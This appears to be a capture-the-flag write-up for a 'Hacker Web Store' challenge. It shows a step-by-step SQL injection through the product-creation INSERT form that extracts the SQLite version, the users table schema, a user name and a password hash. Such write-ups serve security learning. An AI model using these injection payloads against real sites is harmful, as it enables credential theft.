# Hacker Web Store
Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.

This challenge may require a local password list, which we have provided below. Reminder, bruteforcing logins is not necessary and against the rules.

# Flag

# Solution
Vulnerable to SQL Injection when executing INSERT statements to create new products. 

Assuming SQL statement is similar to this:

```sql
INSERT INTO products (name,price,desc)
VALUES ('test',2,'test');
```

Injecting: `name=test',10,(select+sqlite_version()))--+-&price=4&desc=hi`
```
3.31.1
```

Injecting: `name=test',10,(select+sql+from+sqlite_master))--+-&price=4&desc=hi`
```
CREATE TABLE users ( id INTEGER NOT NULL, name VARCHAR(100), password VARCHAR(100) NOT NULL, PRIMARY KEY (id) )
```

Injecting: `name=test',10,(select+name+from+users))--+-&price=4&desc=hi`
```
Joram
```

Injecting: `name=test',10,(select+password+from+users+where+name='Joram'))--+-&price=4&desc=hi`
```
pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
```

